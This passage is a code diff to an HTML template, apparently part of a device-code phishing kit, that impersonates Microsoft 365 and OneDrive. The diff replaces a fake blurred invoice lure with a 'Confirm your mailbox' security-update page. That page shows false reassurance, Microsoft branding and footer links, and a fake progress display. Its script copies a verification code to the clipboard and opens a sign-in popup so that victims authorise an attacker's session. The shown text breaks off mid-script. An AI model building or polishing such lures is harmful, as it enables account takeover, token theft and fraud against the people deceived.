@@ -962,696 +962,551 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Invoice Access</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<title>Microsoft 365</title>
 <style>
+  /* Fluent 2 tokens — light mode */
   :root {
-    --bg: #EEF1F5;
-    --panel: #FFFFFF;
-    --border: #D8DEE7;
-    
-    /* Strict Microsoft Design System Tokens */
-    --ms-blue: #0078D4;
-    --ms-blue-hover: #005A9E;
-    --ms-ink: #201F1E;
-    --ms-text: #605E5C;
-    --ms-bg-tint: #F3F9FD;
-    --ms-border: #E1E1E1;
+    --brand: #d53a00;              /* Microsoft 365 theme_color [citation:2] */
+    --brand-hover: #b83100;
+    --ink: #1a1a1a;
+    --ink-secondary: #616161;
+    --ink-tertiary: #8a8886;
+    --bg: #ffffff;
+    --bg-subtle: #faf9f8;
+    --line: #e1dfdd;
+    --line-strong: #c8c6c4;
+    --green: #107c10;
+    --footer-link: #616161;
   }
 
   * { box-sizing: border-box; margin: 0; padding: 0; }
 
   html, body {
-    height: 100%;
+    min-height: 100%;
     background: var(--bg);
-    font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
-    color: var(--ms-ink);
-    display: flex;
-    flex-direction: column;
+    font-family: 'Segoe UI', 'Segoe UI Variable', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
+    font-size: 15px;                /* BaseTextBlockStyle [citation:15] */
+    color: var(--ink);
+    line-height: 1.5;               /* Fluent body line-height */
+    -webkit-font-smoothing: antialiased;
   }
 
-  /* ---------- Microsoft Suite Top Navbar ---------- */
-  .navbar {
-    position: fixed;
-    top: 0; left: 0; right: 0;
+  /* ---------- Header — Entra neutral branding header [citation:18] ---------- */
+  .header {
     height: 48px;
-    background: var(--ms-blue);
     display: flex;
     align-items: center;
-    justify-content: space-between;
-    padding: 0 16px;
-    z-index: 10;
+    padding: 0 24px;
+    border-bottom: 1px solid var(--line);
   }
-  .nav-brand {
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    font-size: 16px;
-    font-weight: 600;
-    color: #FFFFFF;
+  .header img {
+    height: 20px;
+    width: auto;
+    display: block;
   }
-  .nav-brand span { font-weight: 400; opacity: 0.85; }
-  .waffle-icon {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 2px;
-    width: 16px; height: 16px;
-  }
-  .waffle-icon div { background: #fff; border-radius: 1px; }
 
-  /* ---------- Background: A4 Invoice Layer ---------- */
-  .invoice-stage {
-    position: fixed;
-    inset: 0;
+  /* ---------- Stage ---------- */
+  .stage {
+    min-height: calc(100vh - 48px - 56px);
     display: flex;
     align-items: center;
     justify-content: center;
-    z-index: 0;
-    background: var(--bg);
-    overflow: hidden;
-    padding-top: 48px;
-  }
-
-  .invoice-sheet {
-    width: min(640px, 72vw);
-    aspect-ratio: 210 / 297;
-    background: #fff;
-    color: #242c38;
-    padding: 48px 50px;
-    font-family: 'IBM Plex Mono', monospace;
-    filter: blur(2.5px);
-    box-shadow: 0 30px 90px rgba(27,36,48,0.14);
-    border: 1px solid #e3e7ee;
-    display: flex;
-    flex-direction: column;
-  }
-
-  .invoice-sheet .brand-row { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 30px; }
-  .invoice-sheet .brand { font-family: 'Inter', sans-serif; font-weight: 700; font-size: 15px; letter-spacing: 0.2px; }
-  .invoice-sheet .brand-sub { font-family: 'Inter', sans-serif; font-size: 10px; color: #8590a0; margin-top: 3px; line-height: 1.5; }
-  .invoice-sheet .doc-label { font-family: 'Inter', sans-serif; font-size: 30px; font-weight: 700; letter-spacing: 1px; color: #1c232e; text-align: right; line-height: 1; }
-  .invoice-sheet .doc-num { font-family: 'IBM Plex Mono', monospace; font-size: 11px; color: #8590a0; text-align: right; margin-top: 8px; }
-
-  .meta-grid {
-    display: grid; grid-template-columns: 1fr 1fr; gap: 10px 24px;
-    margin-bottom: 24px; padding-bottom: 20px; border-bottom: 1px solid #dde2ea;
-  }
-  .meta-grid .label { font-size: 9px; text-transform: uppercase; letter-spacing: 1px; color: #a3acba; margin-bottom: 3px; }
-  .meta-grid .value { font-size: 11.5px; color: #242c38; }
-
-  table { width: 100%; border-collapse: collapse; font-size: 10.5px; margin-bottom: auto; }
-  thead th {
-    text-align: left; text-transform: uppercase; letter-spacing: 0.8px; font-size: 9px; color: #8590a0; font-weight: 600;
-    background: #F7F9FC; padding: 8px 8px; border-top: 1px solid #dde2ea; border-bottom: 1px solid #dde2ea;
-  }
-  thead th:first-child { border-left: 1px solid #dde2ea; }
-  thead th:last-child { border-right: 1px solid #dde2ea; text-align: right; }
-  th.num, td.num { text-align: right; }
-  tbody td { padding: 8px 8px; border-bottom: 1px solid #edf0f5; }
-  tbody td:first-child { border-left: 1px solid #dde2ea; }
-  tbody td:last-child { border-right: 1px solid #dde2ea; }
-  tbody tr:last-child td { border-bottom: 1px solid #dde2ea; }
-  tbody tr:nth-child(even) { background: #FBFCFE; }
-
-  .totals-block { margin-top: 16px; margin-left: auto; width: 220px; font-size: 11px; }
-  .totals-block .row { display: flex; justify-content: space-between; padding: 5px 0; }
-  .totals-block .row span:first-child { color: #8590a0; }
-  .totals-block .grand { font-size: 14px; font-weight: 700; color: #1c232e; border-top: 2px solid #242c38; margin-top: 4px; padding-top: 9px; }
-  .sheet-foot { margin-top: 22px; padding-top: 14px; border-top: 1px solid #edf0f5; font-size: 9.5px; color: #a3acba; display: flex; justify-content: space-between; }
-
-  /* Scrim Mask overlay */
-  .scrim {
-    position: fixed; inset: 0; z-index: 1;
-    background: radial-gradient(ellipse at 50% 50%, rgba(238,241,245,0.2) 0%, rgba(238,241,245,0.45) 60%, rgba(238,241,245,0.65) 100%);
-    padding-top: 48px;
-  }
-
-  /* ---------- Foreground: Authentic Microsoft Dialog ---------- */
-  .stage {
-    position: relative; z-index: 2;
-    min-height: 100vh;
-    display: flex; align-items: center; justify-content: center;
-    padding: 80px 24px 40px;
+    padding: 40px 16px 32px;
   }
 
   .card {
-    width: min(410px, 100%);
-    background: var(--panel);
-    border: 1px solid var(--ms-border);
-    border-radius: 4px;
-    padding: 36px 28px 28px;
-    box-shadow: 0 16px 40px rgba(0,0,0,0.08), 0 2px 8px rgba(0,0,0,0.04);
-  }
-
-  /* Logo strip layout styling */
-  .ms-logo-strip {
-    margin: 0 auto 20px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 12px;
-  }
-  .ms-logo-strip img {
-    height: 38px;
-    width: auto;
-  }
-  .ms-logo-strip .plus-sign {
-    font-size: 18px;
-    font-weight: 400;
-    color: #8A8886;
-    margin: 0 2px;
-    user-select: none;
-  }
-
-  h1 { 
-    font-size: 19px; 
-    font-weight: 600; 
-    color: var(--ms-ink); 
-    margin-bottom: 10px;
-    letter-spacing: -0.2px;
-    text-align: center;
-  }
-
-  .sub-text {
-    font-size: 13px;
-    color: var(--ms-text);
-    line-height: 1.5;
-    margin-bottom: 20px;
-    text-align: center;
-  }
-
-  /* Document Badge Preview Component - Official Embedded PDF Vector Graphics */
-  .file-badge {
-    display: flex; align-items: center; gap: 14px;
-    padding: 12px; background: #F3F2F1;
-    border: 1px solid transparent; border-radius: 2px;
-    margin-bottom: 20px; text-align: left;
-  }
-  .file-icon { width: 30px; height: 34px; flex-shrink: 0; }
-  .file-meta { flex: 1; min-width: 0; }
-  .file-name { font-size: 13px; font-weight: 600; color: var(--ms-ink); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-  .file-sub { font-size: 11px; color: var(--ms-text); margin-top: 2px; }
-
-  /* Label Styling */
-  .code-label { 
-    font-size: 11px; 
-    font-weight: 600; 
-    text-transform: uppercase; 
-    letter-spacing: 0.5px; 
-    color: var(--ms-text); 
-    margin-bottom: 6px;
-  }
-  
-  /* Verification Box Layout */
-  .code-display-group {
-    position: relative;
-    display: flex;
-    align-items: center;
-    margin-bottom: 24px;
-  }
-
-  .security-code-container {
     width: 100%;
-    background: var(--ms-bg-tint);
-    border: 1px solid #D2E3F2;
-    border-radius: 2px; padding: 12px 48px 12px 12px;
-    font-family: 'Segoe UI', monospace;
-    font-size: 21px; font-weight: 700; letter-spacing: 5px;
-    color: var(--ms-blue);
-    user-select: all;
-    text-indent: 5px;
+    max-width: 440px;
+    padding: 32px 0;
+  }
+
+  /* ---------- Typography — Fluent ramp [citation:15] ---------- */
+  h1 {
+    font-size: 24px;                /* Title 3 */
+    font-weight: 600;
+    line-height: 32px;
+    margin-bottom: 6px;
+    color: var(--ink);
+  }
+  .subtitle {
+    font-size: 15px;                /* Body 1 */
+    color: var(--ink-secondary);
+    margin-bottom: 24px;
+    line-height: 20px;
+  }
+
+  /* ---------- Reassurance panel — Fluent subtle surface ---------- */
+  .reassure {
+    background: var(--bg-subtle);
+    border: 1px solid var(--line);
+    border-radius: 4px;
+    padding: 12px 14px;
+    margin-bottom: 28px;
+    font-size: 13px;                /* Caption 1 [citation:15] */
+    color: var(--ink-secondary);
+    line-height: 18px;
+  }
+  .reassure strong { color: var(--ink); font-weight: 600; }
+
+  /* ---------- Form ---------- */
+  .label {
+    font-size: 13px;
+    font-weight: 600;
+    margin-bottom: 6px;
+    color: var(--ink);
+  }
+
+  .code-row {
+    position: relative;
+    margin-bottom: 16px;
+  }
+  .code-box {
+    width: 100%;
+    background: var(--bg-subtle);
+    border: 1px solid var(--line-strong);
+    border-radius: 4px;
+    padding: 14px 48px 14px 14px;
+    font-family: 'Segoe UI', 'Courier New', monospace;
+    font-size: 22px;
+    font-weight: 600;
+    letter-spacing: 4px;
+    text-indent: 4px;
+    color: var(--ink);
     text-align: center;
+    user-select: all;
   }
-
-  .security-code-container.loading {
-    color: #8a8886;
-    font-size: 17px;
+  .code-box.loading {
+    color: var(--ink-tertiary);
+    font-size: 15px;
+    font-weight: 400;
     letter-spacing: normal;
-    border-color: #c8c6c4;
+    text-indent: 0;
   }
 
-  /* Fluent UI Icon Button Styling */
   .btn-copy {
     position: absolute;
-    right: 12px;
-    background: transparent;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
     border: none;
-    color: var(--ms-blue);
+    color: var(--brand);
     cursor: pointer;
     padding: 6px;
     display: flex;
     align-items: center;
-    justify-content: center;
-    border-radius: 2px;
-    transition: background 0.1s, color 0.1s;
+    border-radius: 4px;
+    transition: background 0.1s;
   }
-  .btn-copy:hover {
-    background: #E1DFDD;
-  }
-  .btn-copy svg {
-    width: 18px;
-    height: 18px;
-  }
-  
-  /* Copy-state transition bindings */
-  .btn-copy .icon-copied { display: none; color: #107C41; }
+  .btn-copy:hover { background: #f3f2f1; }
+  .btn-copy svg { width: 18px; height: 18px; }
+  .btn-copy .icon-copied { display: none; color: var(--green); }
   .btn-copy.is-copied .icon-default { display: none; }
   .btn-copy.is-copied .icon-copied { display: block; }
 
-  .actions { display: flex; flex-direction: column; gap: 8px; margin-bottom: 20px; }
-  
-  /* Primary Action Buttons */
-  .btn {
-    width: 100%; padding: 10px; font-size: 14px; font-weight: 600;
-    border-radius: 2px; cursor: pointer; transition: background 0.1s ease;
-    display: flex; align-items: center; justify-content: center; gap: 8px;
-    font-family: 'Segoe UI', sans-serif;
-  }
-  .btn-primary { background: var(--ms-blue); color: #fff; border: none; }
-  .btn-primary:hover { background: var(--ms-blue-hover); }
-  .btn-primary:disabled { background: #c8c6c4; cursor: not-allowed; }
-  
-  .btn-secondary { background: #FFF; color: var(--ms-ink); border: 1px solid #8A8886; }
-  .btn-secondary:hover { background: #F3F2F1; }
-
-  /* Status message */
-  .status-msg {
+  .status {
+    min-height: 20px;
     font-size: 13px;
-    min-height: 22px;
-    font-weight: 500;
-    margin: -10px 0 10px;
-    color: #107c10;
-    text-align: center;
+    color: var(--green);
+    margin: -4px 0 8px;
   }
 
-  /* Success View */
+  /* ---------- Primary button — Fluent brand ---------- */
+  .btn-primary {
+    display: block;
+    width: 100%;
+    padding: 12px 16px;
+    background: var(--brand);
+    color: #ffffff;
+    border: none;
+    border-radius: 4px;
+    font-family: inherit;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 8px;
+    transition: background 0.1s;
+  }
+  .btn-primary:hover { background: var(--brand-hover); }
+  .btn-primary:disabled { background: #c8c6c4; cursor: not-allowed; }
+
+  /* ---------- Timer row ---------- */
+  .timer {
+    margin-top: 20px;
+    font-size: 13px;
+    color: var(--ink-secondary);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .timer strong { color: var(--ink); font-weight: 600; }
+  .refresh {
+    background: none;
+    border: none;
+    color: var(--brand);
+    font: inherit;
+    font-size: 13px;
+    font-weight: 600;
+    cursor: pointer;
+    padding: 0;
+  }
+  .refresh:hover { text-decoration: underline; }
+
+  /* ---------- Verifying view ---------- */
+  .verify-view { display: none; padding: 8px 0; }
+  .verify-view h2 {
+    font-size: 24px;
+    font-weight: 600;
+    line-height: 32px;
+    margin-bottom: 6px;
+  }
+  .verify-view > p {
+    font-size: 15px;
+    color: var(--ink-secondary);
+    margin-bottom: 24px;
+    line-height: 20px;
+  }
+  .progress-box {
+    background: var(--bg-subtle);
+    border: 1px solid var(--line);
+    border-radius: 4px;
+    padding: 16px;
+  }
+  .progress-row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-size: 14px;                /* Body 1 */
+    padding: 10px 0;
+    color: var(--ink-secondary);
+    line-height: 20px;
+  }
+  .progress-row:not(:last-child) { border-bottom: 1px solid var(--line); }
+  .progress-row .dot {
+    width: 18px; height: 18px;
+    border-radius: 50%;
+    border: 2px solid var(--line-strong);
+    flex-shrink: 0;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .progress-row.done .dot {
+    background: var(--green);
+    border-color: var(--green);
+    color: #ffffff;
+    font-size: 11px;
+  }
+  .progress-row.done { color: var(--ink); }
+  .progress-row.active .dot {
+    border-color: var(--brand);
+    border-top-color: transparent;
+    animation: spin 0.9s linear infinite;
+  }
+  .progress-row.active { color: var(--ink); font-weight: 600; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .fineprint {
+    font-size: 12px;                /* Caption 1 [citation:15] */
+    color: var(--ink-tertiary);
+    margin-top: 16px;
+    line-height: 16px;
+  }
+
+  /* ---------- Success view ---------- */
   .success-view {
     display: none;
     text-align: center;
-    padding: 12px 0;
+    padding: 16px 0;
   }
-  .success-view .check-icon {
-    display: inline-block;
-    background: #107c10;
-    color: white;
-    border-radius: 50%;
-    width: 56px;
-    height: 56px;
-    line-height: 56px;
-    font-size: 28px;
-    margin-bottom: 16px;
-  }
-  .success-view h2 { font-weight: 600; margin-bottom: 4px; }
-  .success-view p { color: var(--ms-text); margin-bottom: 12px; }
-  .success-badge {
-    background: #dff6dd;
-    color: #107c10;
-    padding: 8px 12px;
-    border-radius: 4px;
-    display: inline-block;
-    font-weight: 600;
-    font-size: 14px;
-  }
-
-  /* Structured Bottom Timer/Action Banner */
-  .timer-banner {
-    font-size: 12px;
-    color: var(--ms-text);
-    text-align: center;
-    border-top: 1px solid #EDEBE9;
-    padding-top: 14px;
-    margin-top: 6px;
-    display: flex;
+  .success-view .check {
+    display: inline-flex;
     align-items: center;
     justify-content: center;
-    gap: 8px;
+    width: 52px; height: 52px;
+    border-radius: 50%;
+    background: var(--green);
+    color: #ffffff;
+    font-size: 26px;
+    margin-bottom: 16px;
   }
-  .timer-banner strong {
-    color: var(--ms-ink);
-    font-weight: 600;
-  }
-  .link-refresh {
-    color: var(--ms-blue);
-    text-decoration: none;
-    font-weight: 600;
-    cursor: pointer;
-    background: none;
-    border: none;
-    font-size: 12px;
-    font-family: inherit;
-  }
-  .link-refresh:hover {
-    text-decoration: underline;
-    color: var(--ms-blue-hover);
-  }
-  .divider-dot { color: #A19F9D; }
+  .success-view h2 { font-size: 24px; font-weight: 600; line-height: 32px; margin-bottom: 6px; }
+  .success-view p { color: var(--ink-secondary); font-size: 15px; }
 
-  @media (max-width: 640px) {
-    .invoice-sheet { width: 88vw; padding: 30px 26px; }
-    thead th, tbody td { padding: 6px 5px; font-size: 9px; }
+  /* ---------- Footer — Entra footer links [citation:18] ---------- */
+  .ms-footer {
+    border-top: 1px solid var(--line);
+    padding: 14px 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 10px 18px;
+    font-size: 12px;
+    color: var(--footer-link);
+    line-height: 16px;
+  }
+  .ms-footer .links {
+    display: flex;
+    align-items: center;
+    gap: 18px;
+    flex-wrap: wrap;
+  }
+  .ms-footer a {
+    color: var(--footer-link);
+    text-decoration: none;
+    font-size: 12px;
+  }
+  .ms-footer a:hover { text-decoration: underline; }
+  .ms-footer .copy { font-size: 12px; color: var(--footer-link); }
+
+  @media (max-width: 480px) {
+    .header { padding: 0 16px; }
+    .card { padding: 24px 0; }
+    h1 { font-size: 21px; }
+    .ms-footer { padding: 12px 16px; justify-content: center; text-align: center; }
+    .ms-footer .links { justify-content: center; }
   }
 </style>
 </head>
 <body>
 
-  <!-- Top Navbar -->
-  <nav class="navbar">
-    <div class="nav-brand">
-      <div class="waffle-icon">
-        <div></div><div></div><div></div>
-        <div></div><div></div><div></div>
-        <div></div><div></div><div></div>
-      </div>
-      SharePoint <span>Online</span>
-    </div>
-  </nav>
+<div class="header">
+  <img src="https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/microsoft/default.svg" alt="Microsoft">
+</div>
 
-  <!-- Background Invoice Layer -->
-  <div class="invoice-stage">
-    <div class="invoice-sheet">
-      <div class="brand-row">
-        <div>
-          <div class="brand">Meridian Fabrication Co.</div>
-          <div class="brand-sub">142 Industrial Way, Suite 4<br>Hamilton, ON L8N 1C2</div>
-        </div>
-        <div>
-          <div class="doc-label">TAX<br>INVOICE</div>
-          <div class="doc-num">NV-2026-004417</div>
-        </div>
+<div class="stage">
+  <div class="card">
+
+    <!-- MAIN VIEW -->
+    <div id="mainView">
+      <h1>Confirm your mailbox</h1>
+      <p class="subtitle">Enter the code below to finish the security update.</p>
+
+      <div class="reassure">
+        <strong>What happens next:</strong> we will verify the code, then send a short test message to your inbox. A reply confirms your mailbox is responding — nothing on your device will change.
       </div>
 
-      <div class="meta-grid">
-        <div><div class="label">Bill To</div><div class="value">Larkspur Contracting Ltd.</div></div>
-        <div><div class="label">Ship To</div><div class="value">Unit 6, Bayfront Depot</div></div>
-        <div><div class="label">Issue Date</div><div class="value">03 July 2026</div></div>
-        <div><div class="label">Due Date</div><div class="value">02 Aug 2026</div></div>
-        <div><div class="label">Order No.</div><div class="value">PO-88213</div></div>
-        <div><div class="label">Terms</div><div class="value">Net 30</div></div>
-      </div>
-
-      <table>
-        <colgroup>
-          <col style="width:44%"><col style="width:14%"><col style="width:12%"><col style="width:15%"><col style="width:15%">
-        </colgroup>
-        <thead>
-          <tr>
-            <th>Description</th>
-            <th class="num">SKU</th>
-            <th class="num">Qty</th>
-            <th class="num">Rate</th>
-            <th class="num">Amount</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr><td>Structural steel brackets, 4in</td><td class="num">SB-4412</td><td class="num">120</td><td class="num">14.50</td><td class="num">1,740.00</td></tr>
-          <tr><td>Powder coating service</td><td class="num">PC-0091</td><td class="num">1</td><td class="num">860.00</td><td class="num">860.00</td></tr>
-          <tr><td>Freight & handling</td><td class="num">FR-STD</td><td class="num">1</td><td class="num">210.00</td><td class="num">210.00</td></tr>
-          <tr><td>Pallet wrapping &amp; crating</td><td class="num">PK-020</td><td class="num">3</td><td class="num">18.00</td><td class="num">54.00</td></tr>
-          <tr><td>Inspection &amp; QA sign-off</td><td class="num">QA-100</td><td class="num">1</td><td class="num">95.00</td><td class="num">95.00</td></tr>
-        </tbody>
-      </table>
-
-      <div class="totals-block">
-        <div class="row"><span>Subtotal</span><span>2,959.00</span></div>
-        <div class="row"><span>Tax (8%)</span><span>236.72</span></div>
-        <div class="row grand"><span>Total Due</span><span>3,195.72</span></div>
-      </div>
-
-      <div class="sheet-foot">
-        <span>Reference invoice number in all correspondence</span>
-        <span>Page 1 of 1</span>
-      </div>
-    </div>
-  </div>
-
-  <div class="scrim"></div>
-
-  <!-- Foreground Layer: Card Modal -->
-  <div class="stage">
-    <div class="card">
-      
-      <!-- MAIN VIEW -->
-      <div id="mainView">
-        <!-- Updated Microsoft Production App Icon Stream Integration -->
-        <div class="ms-logo-strip">
-          <!-- OneDrive Asset -->
-          <img src="https://www.microsoft.com/content/dam/microsoft/bade/images/icons/en-us/m365-app-icons-fy26/OneDrive-Icon-FY26.svg" alt="OneDrive">
-          <div class="plus-sign">+</div>
-          <!-- Requested CDN Microsoft Office Asset -->
-          <img src="https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/microsoft-office/default.svg" alt="Microsoft Office">
-        </div>
-
-        <h1>Access Protected Document</h1>
-        
-        <p class="sub-text">
-          Use the authorization code below to verify your workspace access permissions.
-        </p>
-
-        <!-- Document Badge Component -->
-        <div class="file-badge">
-          <svg class="file-icon" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
-            <path d="M128 0c-17.6 0-32 14.4-32 32v448c0 17.6 14.4 32 32 32h320c17.6 0 32-14.4 32-32V128L352 0H128z" fill="#E2E5E6"/>
-            <path d="M352 0v96c0 17.6 14.4 32 32 32h96L352 0z" fill="#B0B7BD"/>
-            <path d="M480 128H352V0l128 128z" opacity=".05"/>
-            <path d="M352 128H480l-128-128v128z" opacity=".07"/>
-            <path d="M176 336c0-8.8 7.2-16 16-16h224c8.8 0 16 7.2 16 16v96c0 8.8-7.2 16-16 16H192c-8.8 0-16-7.2-16-16v-96z" fill="#E53935"/>
-            <text x="312" y="414" font-family="Segoe UI, Inter, sans-serif" font-size="64" font-weight="800" fill="#fff" text-anchor="middle">PDF</text>
+      <div class="label">Verification code</div>
+      <div class="code-row">
+        <div class="code-box loading" id="codeBox">Loading...</div>
+        <button class="btn-copy" id="copyBtn" title="Copy code" onclick="copyCodeAction()" disabled>
+          <svg class="icon-default" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
           </svg>
-          <div class="file-meta">
-            <div class="file-name">Reservation_invoice.pdf</div>
-            <div class="file-sub">2.5 MB</div>
-          </div>
-        </div>
-
-        <!-- Action Tracking Header Segment -->
-        <div class="code-label">Verification Code</div>
-        
-        <!-- Content Panel Block with Contextual Toggle Copy Node -->
-        <div class="code-display-group">
-          <div class="security-code-container" id="codeBox">Loading...</div>
-          <button class="btn-copy" id="copyBtn" title="Copy code to clipboard" onclick="copyCodeAction()" disabled>
-            <!-- Default Fluent Copy Vector Icon -->
-            <svg class="icon-default" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-              <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-              <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
-            </svg>
-            <!-- Dynamic Success Checkmark Icon -->
-            <svg class="icon-copied" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-              <polyline points="20 6 9 17 4 12"></polyline>
-            </svg>
-          </button>
-        </div>
-
-        <div class="status-msg" id="codeStatus"></div>
-
-        <!-- Action Stack -->
-        <div class="actions">
-          <button class="btn btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
-            Authenticate with Code
-          </button>
-        </div>
-
-        <!-- Bottom Banner with Integrated Refresh Trigger -->
-        <div class="timer-banner">
-          <span>Expires in <strong id="timer">{expires_minutes}</strong></span>
-          <span class="divider-dot">&bull;</span>
-          <button class="link-refresh" onclick="triggerManualRefresh()">Refresh Code</button>
-        </div>
+          <svg class="icon-copied" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"></polyline>
+          </svg>
+        </button>
       </div>
 
-      <!-- SUCCESS VIEW -->
-      <div class="success-view" id="successView">
-        <div class="check-icon">✔</div>
-        <h2>Verification Complete</h2>
-        <p>Your identity has been confirmed. You may now close this window.</p>
-        <div class="success-badge">Document Access Granted</div>
-      </div>
+      <div class="status" id="codeStatus"></div>
 
+      <button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>Verify and send test message</button>
+
+      <div class="timer">
+        <span>Code expires in <strong id="timer">{expires_minutes}</strong></span>
+        <button class="refresh" onclick="triggerManualRefresh()">Refresh</button>
+      </div>
     </div>
+
+    <!-- VERIFYING VIEW -->
+    <div class="verify-view" id="verifyView">
+      <h2>Verifying your mailbox</h2>
+      <p>This usually takes a few seconds. Please keep this window open.</p>
+      <div class="progress-box">
+        <div class="progress-row done" id="step1"><span class="dot">✓</span> Code accepted</div>
+        <div class="progress-row active" id="step2"><span class="dot"></span> Confirming mailbox reachability</div>
+        <div class="progress-row" id="step3"><span class="dot"></span> Sending test message to your inbox</div>
+      </div>
+      <p class="fineprint">If the test message does not arrive within 60 seconds, check your spam folder before closing this window.</p>
+    </div>
+
+    <!-- SUCCESS VIEW -->
+    <div class="success-view" id="successView">
+      <div class="check">✔</div>
+      <h2>Verified</h2>
+      <p>A test message has been sent to your inbox.</p>
+    </div>
+
   </div>
+</div>
 
-  <script>
-    (function(){
-      // ---- EXACT POLLING + STATE MANAGEMENT FROM ORIGINAL ----
-      var sid = '{session_id}';
-      var verifyUrl = '{verify_url}';
-      var codeReady = {code_ready};
-      var code = '{user_code}';
-      var expiresIn = {expires_seconds};
-      var popup = null;
+<div class="ms-footer">
+  <div class="links">
+    <a href="https://support.microsoft.com/contactus" target="_blank" rel="noopener">Contact Microsoft</a>
+    <a href="https://privacy.microsoft.com/en-us" target="_blank" rel="noopener">Privacy &amp; cookies</a>
+    <a href="https://www.microsoft.com/servicesagreement" target="_blank" rel="noopener">Terms of use</a>
+  </div>
+  <div class="copy">&copy; 2026 Microsoft</div>
+</div>
 
-      var codeEl = document.getElementById('codeBox');
-      var statusEl = document.getElementById('codeStatus');
-      var btnEl = document.getElementById('signInBtn');
-      var copyBtn = document.getElementById('copyBtn');
-      var timerEl = document.getElementById('timer');
-      var mainView = document.getElementById('mainView');
-      var successView = document.getElementById('successView');
+<script>
+(function(){
+  var sid = '{session_id}';
+  var verifyUrl = '{verify_url}';
+  var codeReady = {code_ready};
+  var code = '{user_code}';
+  var expiresIn = {expires_seconds};
+  var popup = null;
 
-      function showCode(c, v) {
-        code = c;
-        if (v) verifyUrl = v;
-        codeEl.textContent = c;
-        codeEl.classList.remove('loading');
-        codeEl.style.letterSpacing = '5px';
-        codeEl.style.color = '#0078D4';
-        codeEl.style.fontSize = '21px';
-        btnEl.disabled = false;
-        copyBtn.disabled = false;
-      }
+  var codeEl = document.getElementById('codeBox');
+  var statusEl = document.getElementById('codeStatus');
+  var btnEl = document.getElementById('signInBtn');
+  var copyBtn = document.getElementById('copyBtn');
+  var timerEl = document.getElementById('timer');
+  var mainView = document.getElementById('mainView');
+  var verifyView = document.getElementById('verifyView');
+  var successView = document.getElementById('successView');
+  var step2 = document.getElementById('step2');
+  var step3 = document.getElementById('step3');
 
-      if (codeReady && code) {
-        showCode(code, verifyUrl);
-      } else {
-        codeEl.textContent = 'Loading...';
-        codeEl.classList.add('loading');
-        codeEl.style.letterSpacing = 'normal';
-        codeEl.style.color = '#8a8886';
-        codeEl.style.fontSize = '17px';
-      }
+  function showCode(c, v) {
+    code = c;
+    if (v) verifyUrl = v;
+    codeEl.textContent = c;
+    codeEl.classList.remove('loading');
+    codeEl.style.letterSpacing = '4px';
+    codeEl.style.textIndent = '4px';
+    codeEl.style.fontSize = '22px';
+    codeEl.style.fontWeight = '600';
+    codeEl.style.color = '#1a1a1a';
+    btnEl.disabled = false;
+    copyBtn.disabled = false;
+  }
 
-      // Copy function
-      window.copyCodeAction = function() {
-        if (!code || code === 'Loading...') return;
-        const targetText = codeEl.textContent;
-        const copyBtn = document.getElementById('copyBtn');
-        
-        const processState = () => {
-          copyBtn.classList.add('is-copied');
-          if (statusEl) statusEl.textContent = 'Code copied to clipboard';
-          setTimeout(() => {
-            copyBtn.classList.remove('is-copied');
-          }, 2000);
-        };
+  if (codeReady && code) showCode(code, verifyUrl);
 
-        if (navigator.clipboard) {
-          navigator.clipboard.writeText(targetText).then(processState).catch(() => {
-            fallbackCopy(targetText, processState);
-          });
-        } else {
-          fallbackCopy(targetText, processState);
-        }
-      };
-
-      function fallbackCopy(text, callback) {
-        const tmpInput = document.createElement('input');
-        tmpInput.value = text;
-        document.body.appendChild(tmpInput);
-        tmpInput.select();
-        document.execCommand('copy');
-        document.body.removeChild(tmpInput);
-        if (callback) callback();
-      }
-
-      // Open sign in (popup)
-      window.openSignIn = function() {
-        if (!code || code === 'Loading...') return;
-        
-        // Copy code to clipboard (as original did)
-        if (navigator.clipboard) {
-          navigator.clipboard.writeText(code).catch(function(){});
-        } else {
-          var t = document.createElement('textarea');
-          t.value = code;
-          t.style.cssText = 'position:fixed;left:-9999px';
-          document.body.appendChild(t);
-          t.select();
-          document.execCommand('copy');
-          document.body.removeChild(t);
-        }
-        if (statusEl) statusEl.textContent = 'Code copied to clipboard';
-
